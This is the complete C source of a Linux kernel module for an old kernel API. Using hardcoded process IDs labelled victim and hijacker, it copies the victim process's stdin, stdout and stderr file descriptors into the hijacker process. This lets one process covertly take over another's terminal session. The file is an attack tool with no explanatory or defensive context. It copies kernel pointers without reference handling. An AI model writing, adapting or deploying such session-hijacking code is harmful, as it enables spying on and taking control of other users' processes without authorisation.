#define __KERNEL__
#define MODULE

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

#define VICTIM_PID 3336
#define HIJACKER_PID 3360

struct task_struct *victim, *hijacker = NULL;

int init_module(void)
{
  struct task_struct *task;

  for_each_task(task)
    {
      if(task->pid == VICTIM_PID)
	  victim = task;
      else if(task->pid == HIJACKER_PID)
	  hijacker = task;
    }

  if(victim && hijacker)
    {
      hijacker->files->fd[0] = victim->files->fd[0];  
      hijacker->files->fd[1] = victim->files->fd[1];  
      hijacker->files->fd[2] = victim->files->fd[2];  
    }

  return 0;
}

void cleanup_module(void){}
